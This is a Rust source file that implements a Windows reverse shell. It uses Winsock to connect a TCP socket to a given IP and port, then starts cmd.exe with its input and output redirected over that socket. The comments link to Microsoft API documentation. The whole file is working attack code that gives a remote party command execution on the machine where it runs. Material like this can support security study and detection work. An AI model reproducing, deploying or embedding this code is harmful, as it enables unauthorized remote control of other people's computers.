use std::ffi::{c_void, CStr, CString};
use std::{mem, ptr};
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Networking::WinSock::{
    connect, htons, inet_pton, WSADATA, WSASocketA, WSAStartup, AF_INET, IPPROTO_TCP, SOCKADDR,
    SOCKADDR_IN, SOCKET, SOCK_STREAM,
};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::SystemInformation::GetSystemDirectoryA;
use windows::Win32::System::Threading::{
    CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
};

// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms632663(v=vs.85)
// Normally this is called by MAKEWORD(2,2), which is 514
const WSASTARTUPVAL: u16 = 514;

pub fn shell(ip: &str, port: u16) {
    // Call WSAStartup so that you can do anything with sockets
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSAStartup.html
    let wsa_start_result = unsafe { WSAStartup(WSASTARTUPVAL, &mut WSADATA::default()) };
    if wsa_start_result != 0 {
        panic!("Unable to call WSAStartup")
    }

    // Call WSASocket to create a socket
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSASocketA.html
    let socket = unsafe {
        WSASocketA(
            AF_INET.0 as i32,
            SOCK_STREAM as i32,
            IPPROTO_TCP.0,
            None,
            0,
            0,
        )
    };

    // Call inet_pton to populate the sockaddr_in.sin_addr field, which is needed as part of the socket connection
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.inet_pton.html
    let mut sockaddr_in = SOCKADDR_IN {
        sin_family: AF_INET.0 as u16,
        ..Default::default()
    };
    // This is magic that I don't really understand but seems to work
    let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
    // Create a PCSTR and use the IP string as the 0 field
    let ip_pcstr = PCSTR(CString::new(ip).unwrap().into_raw() as *mut u8);
    // Calling pton with the pointer sin_addr_ptr --> sockaddr_in.sin_addr should mean sockaddr_in.sin_addr has the IP struct now
    let conversion_result = unsafe { inet_pton(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr) };
    if conversion_result != 1 {
        panic!("Unable to convert IP address to usable form with inet_pton")
    }

    // Call htons to convert the port from a u16 to the TCP/IP network order
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.htons.html
    sockaddr_in.sin_port = unsafe { htons(port) };

    // Connect the socket!
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.connect.html
    let connection_result = unsafe {
        connect(
            socket,
            &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
            mem::size_of::<SOCKADDR_IN>() as _,
        )
    };
    if connection_result != 0 {
        panic!("Unable to call connect to the remote socket")
    }

    // Call GetSystemDirectoryA to figure out where cmd.exe will be
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/SystemInformation/fn.GetSystemDirectoryA.html
    let lp_buffer: &mut [u8] = &mut [0; 50];
    unsafe { GetSystemDirectoryA(Some(lp_buffer)) };
    let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
    let system_dir = system_dir.to_str().unwrap();

    // Call CreateProcessA to spawn a shell with stdin/stdout/stderr as the socket
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
    // dwFlags --> STARTF_USESTDHANDLES (0x00000100) means that stdin/stdout/stderr contain information that needs to be parsed
    let mut startup_info = STARTUPINFOA {
        cb: mem::size_of::<STARTUPINFOA>() as u32,
        dwFlags: STARTF_USESTDHANDLES,
        ..Default::default()
    };
    let sock_handle = &socket as *const SOCKET as *const HANDLE;
    startup_info.hStdInput = unsafe { *sock_handle };
    startup_info.hStdOutput = unsafe { *sock_handle };
    startup_info.hStdError = unsafe { *sock_handle };
    let lp_command_line = PSTR(
        CString::new(format!("{system_dir}\\cmd.exe"))
            .unwrap()
            .into_raw() as *mut u8,
    );
    let create_res = unsafe {
        CreateProcessA(
            PCSTR::null(),
            lp_command_line,
            Some(&SECURITY_ATTRIBUTES::default()),
            Some(&SECURITY_ATTRIBUTES::default()),
            true,
            PROCESS_CREATION_FLAGS::default(),
            ptr::null(),
            PCSTR::null(),
            &startup_info,
            &mut PROCESS_INFORMATION::default(),
        )
    };
    if !create_res.as_bool() {
        panic!("Could not start cmd.exe process");
    }
}
